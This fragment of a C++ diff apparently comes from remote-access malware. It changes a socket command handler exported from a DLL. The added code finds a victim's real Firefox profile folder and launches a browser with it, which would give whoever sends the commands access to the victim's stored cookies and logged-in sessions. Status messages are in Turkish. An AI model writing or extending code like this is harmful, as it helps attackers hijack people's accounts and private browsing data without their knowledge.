@@ -2123,7 +2123,37 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             tempProfileRoot += exeName;
                         }
                         tempProfileRoot += L"_Profile";
-                        profilePath = tempProfileRoot;
+
+                        if (isGecko) {
+                            wstring sourceUserData = get_gecko_profile_path(wRequestedPath);
+                            if (!sourceUserData.empty() && fs::exists(sourceUserData)) {
+                                wstring profilesPath = sourceUserData + L"\\Profiles";
+                                wstring profileSubDir;
+                                WIN32_FIND_DATAW findData;
+                                HANDLE hFind = FindFirstFileW((profilesPath + L"\\*").c_str(), &findData);
+                                if (hFind != INVALID_HANDLE_VALUE) {
+                                    do {
+                                        wstring name = findData.cFileName;
+                                        if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                                            name != L"." && name != L"..") {
+                                            profileSubDir = name;
+                                            break;
+                                        }
+                                    } while (FindNextFileW(hFind, &findData));
+                                    FindClose(hFind);
+                                }
+
+                                if (!profileSubDir.empty()) {
+                                    profilePath = sourceUserData + L"\\Profiles\\" + profileSubDir;
+                                } else {
+                                    profilePath = sourceUserData;
+                                }
+                            } else {
+                                profilePath = tempProfileRoot;
+                            }
+                        } else {
+                            profilePath = tempProfileRoot;
+                        }
                     }
 
                     send_status("Tarayıcı başlatılıyor...");
